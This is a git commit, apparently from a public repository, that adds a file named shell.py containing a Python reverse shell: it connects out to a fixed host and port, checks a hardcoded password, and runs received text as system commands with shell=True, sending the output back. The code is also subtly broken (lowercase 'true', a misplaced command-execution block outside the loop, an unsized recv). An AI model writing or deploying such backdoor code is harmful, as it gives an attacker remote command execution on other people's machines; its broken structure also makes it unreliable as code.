1367d7f4cd2c642f9f560c61243da4cb9ea62bf8
Anonymous Gafia <59519597+AnonymousGafia@users.noreply.github.com>
2020-10-28 00:34:31 +0100

    Add files via upload

---
+++ shell.py
@@ -0,0 +1,32 @@
+import subprocess
+from socket import *
+
+host = '127.0.0.1'
+port = 443
+password = 'anonymous'
+
+def login():
+    global s 
+    s.send('login:>')
+    pwd = s.recv()
+    if pwd.strip() != password:
+        login()
+    else:
+        s.send('connected:>')
+        shell()
+
+def shell():
+    while true:
+        data = s.recv(1024)
+        if data.strip() == 'kill' :
+          break
+
+
+proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+output = proc.stderr.read() + proc.stdout.read()
+s.send(output)
+s.send('shell')
+
+s = socket(AF_INET,SOCK_STREAM)
+s.connect((host,port))
+login()
